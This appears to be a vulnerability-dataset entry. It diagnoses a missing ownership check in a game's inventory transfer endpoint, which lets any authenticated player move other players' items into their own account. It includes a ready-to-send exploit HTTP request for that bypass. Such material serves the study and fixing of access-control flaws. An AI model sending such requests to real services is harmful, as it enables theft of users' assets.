diagnosis: The gaming inventory transfer endpoint executes an UPDATE statement via Bun's native SQL client using itemId from the URL, but does not check that player_id equals req.player.id. Any authenticated player can supply an arbitrary itemId to transfer legendary gear, skins, or currency items belonging to other players into their own inventory.
exploit_request:
POST /api/gaming/inventory/item_mythic_sword_7710/transfer HTTP/1.1
Host: realm.game-api.net
Authorization: Bearer player_token_attacker
Content-Type: application/json

{"recipientPlayerId": "player_attacker_account"}
